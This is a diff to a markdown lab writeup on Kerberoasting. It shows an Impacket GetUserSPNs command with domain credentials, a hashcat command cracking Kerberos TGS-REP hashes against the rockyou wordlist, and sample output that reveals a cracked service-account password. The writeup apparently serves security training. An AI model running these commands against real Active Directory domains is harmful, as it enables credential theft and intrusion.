@@ -119,4 +119,22 @@ GetUserSPNs.py readteambd.local/rahimkhan:Password1 -dc-ip 192.168.5.134 -reques
 ```bash
 hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
-`-m 13100 = Kerberos 5 TGS-REP (RC4)`
+
+```
+-m 13100 → Kerberos 5 TGS-REP (etype 23)
+kerberoast.txt → file containing extracted hash
+rockyou.txt → password wordlist
+```
+
+**Output:**
+
+```
+Status: Cracked
+Hash Mode: 13100 (Kerberos 5, etype 23, TGS-REP)
+Target Account: sqlservice
+Recovered Password: Mypassword123#
+```
+
+<p align="center">
+  <img src="/writeups/kerbersoting attack/images/step3.png" width="600">
+</p>
